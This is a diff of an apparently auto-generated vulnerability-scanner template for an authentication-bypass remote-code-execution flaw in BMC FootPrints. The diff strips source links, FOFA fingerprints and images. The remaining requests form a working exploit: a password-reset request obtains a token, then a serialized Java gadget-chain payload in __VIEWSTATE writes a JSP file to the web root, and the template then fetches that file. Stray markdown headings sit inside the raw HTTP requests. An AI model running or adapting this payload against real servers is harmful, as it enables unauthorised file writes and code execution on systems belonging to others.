@@ -3,12 +3,8 @@ info:
   name: BMC Footprints存在认证绕过RCE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rcllr46v3x6v2b8z'
+  description: ''
   tags: rce,unauth,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: rcllr46v3x6v2b8z
-    fofa: icon_hash="-1106787596" || body="/footprints/servicedesk/"
 http:
 - raw:
   - 'GET /footprints/servicedesk/passwordreset/request/ HTTP/1.1
@@ -21,7 +17,6 @@ http:
 
     Accept: */*
 
-    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1774777213780-406c9dc1-1f93-44f7-851d-9c76a3484dc3.png)
 
     **利用SEC_TOEKN实现文件写入**'
   redirects: false
@@ -48,7 +43,6 @@ http:
 
     __VIEWSTATE=rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI%2FQAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAGndlYmFwcHMvUk9PVC9WOWhMY1lGMEEuanNwc3IAKm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5tYXAuTGF6eU1hcG7llIKeeRCUAwABTAAHZmFjdG9yeXQALExvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHBzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHEAfgADeHB1cgACW0Ks8xf4BghU4AIAAHhwAAABvjwlQCBwYWdlIGxhbmd1YWdlPSJqYXZhIiBjb250ZW50VHlwZT0idGV4dC9odG1sOyBjaGFyc2V0PVVURi04IiBwYWdlRW5jb2Rpbmc9IlVURi04IiU%2BCjwlCiAgICBTdHJpbmcgb3NVc2VyID0gU3lzdGVtLmdldFByb3BlcnR5KCJ1c2VyLm5hbWUiKTsKICAgIFN0cmluZyBjd2QgPSBTeXN0ZW0uZ2V0UHJvcGVydHkoInVzZXIuZGlyIik7CiU%2BCjwhRE9DVFlQRSBodG1sPgo8aHRtbD4KPGhlYWQ%2BCiAgICA8dGl0bGU%2BVjloTGNZRjBBIFN5c3RlbSBJbmZvPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KICAgIDxoMT5TeXN0ZW0gSW5mb3JtYXRpb248L2gxPgogICAgPHA%2BPHN0cm9uZz5PUyBVc2VyOjwvc3Ryb25nPiA8JT0gb3NVc2VyICU%2BPC9wPgogICAgPHA%2BPHN0cm9uZz5DdXJyZW50IFdvcmtpbmcgRGlyZWN0b3J5Ojwvc3Ryb25nPiA8JT0gY3dkICU%2BPC9wPgo8L2JvZHk%2BCjwvaHRtbD4Kc3IAPm9yZy5hc3BlY3RqLndlYXZlci50b29scy5jYWNoZS5TaW1wbGVDYWNoZSRTdG9yZWFibGVDYWNoaW5nTWFwO6sCH0tqVloCAANKAApsYXN0U3RvcmVkSQAMc3RvcmluZ1RpbWVyTAAGZm9sZGVydAASTGphdmEvbGFuZy9TdHJpbmc7eHIAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA%2FQAAAAAAAAHcIAAAAEAAAAAB4AAABmQ2q4P0AAAAMdAABLnh4
 
-    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1774777214156-5f86880e-ddc9-4561-8cdf-61ce9c234d53.png)
 
     **执行访问**'
   redirects: false
@@ -65,9 +59,7 @@ http:
 
     Accept: */*
 
-    User-Agent: python-requests/2.32.5
-
-    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1774777214519-22a762c8-d85d-4d51-ab25-85de74aceb62.png)'
+    User-Agent: python-requests/2.32.5'
   redirects: false
   matchers:
   - status:
